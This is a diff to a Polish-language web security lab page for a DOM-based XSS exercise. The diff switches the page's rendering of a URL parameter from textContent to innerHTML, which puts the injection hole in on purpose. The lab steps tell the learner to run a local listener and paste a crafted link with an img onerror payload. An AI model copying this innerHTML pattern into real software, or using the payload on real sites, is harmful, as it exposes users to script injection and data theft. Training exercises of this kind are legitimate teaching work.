@@ -50,7 +50,8 @@ if __name__ == '__main__':
     app.run(host='127.0.0.1', port=5000, debug=True)
 </code></pre>
                 </li>
-                <li>Uruchom powyższy kod, aby rozpocząć nasłuchiwanie na żądania obrazu.</li>
+                <li>Uruchom powyższy kod, aby rozpocząć nasłuchiwanie. </li>
+                <pre><code>python nazwa_pliku.py </code></pre>
                 <li>
                     Skonstruuj złośliwy link, który wstrzyknie obraz z obsługą błędu do tej podstrony.
                     Poniżej znajduje się przykład linku, który należy wkleić w przeglądarce:
@@ -91,13 +92,13 @@ http://127.0.0.1:8000/app/tasks/dom_xss/?photo=&lt;img src=x onerror="const img=
         const photoFromUrl = params.get("photo");
 
         if (photoFromUrl) {
-            document.getElementById('user-photo').textContent = `${photoFromUrl}<button id='remove-photo-button'>Usuń zdjęcie</button>`;
+            document.getElementById('user-photo').innerHTML = `${photoFromUrl}<button id='remove-photo-button'>Usuń zdjęcie</button>`;
 
             const baseUrl = window.location.origin + window.location.pathname;
             window.history.replaceState({}, document.title, baseUrl);
 
             document.getElementById('remove-photo-button').addEventListener('click', function() {
-                document.getElementById('user-photo').textContent = '<input type="file" id="file-input" accept="image/*">';
+                document.getElementById('user-photo').innerHTML = '<input type="file" id="file-input" accept="image/*">';
                 addFileInputListener();
             });
         }
